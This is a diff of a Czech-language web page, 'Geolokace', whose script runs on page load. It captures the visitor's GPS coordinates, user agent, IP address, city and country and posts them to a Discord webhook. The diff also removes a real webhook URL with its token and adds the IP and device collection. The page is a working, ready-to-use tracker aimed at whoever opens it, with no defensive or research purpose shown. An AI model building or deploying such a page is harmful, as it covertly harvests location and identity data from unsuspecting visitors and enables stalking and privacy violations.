@@ -5,42 +5,41 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Geolokace</title>
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem
+        const WEBHOOK_URL = "TVŮJ_DISCORD_WEBHOOK_URL"; // Nahraď svým webhookem
 
         function getLocation() {
+            let device = navigator.userAgent; // Detekce zařízení
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lon = position.coords.longitude.toFixed(6);
+                    getIP(device, `📍 GPS: ${lat}, ${lon}`);
+                }, () => {
+                    getIP(device, "🚫 GPS zamítnuta");
                 });
+            } else {
+                getIP(device, "🚫 GPS není podporována");
             }
         }
 
-        function sendToDiscord(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const data = {
-                content: `📍 Nová poloha:\n🌍 Zeměpisná šířka: ${lat}\n🌍 Zeměpisná délka: ${lon}`
-            };
+        function getIP(device, gpsData) {
+            fetch("https://ipinfo.io/json")
+            .then(response => response.json())
+            .then(data => {
+                const message = `📱 Zařízení: ${device}\n${gpsData}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})`;
 
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
+                sendToDiscord(message);
             })
-            .then(response => {
-                if (!response.ok) {
-                    console.error("Chyba při odesílání:", response.statusText);
-                }
-            })
-            .catch(error => console.error("Chyba:", error));
+            .catch(error => console.error("Chyba získání IP:", error));
         }
 
-        function showError(error) {
-            console.error("Chyba při získávání polohy:", error.message);
+        function sendToDiscord(message) {
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: message })
+            }).catch(error => console.error("Chyba odesílání:", error));
         }
 
         window.onload = getLocation;
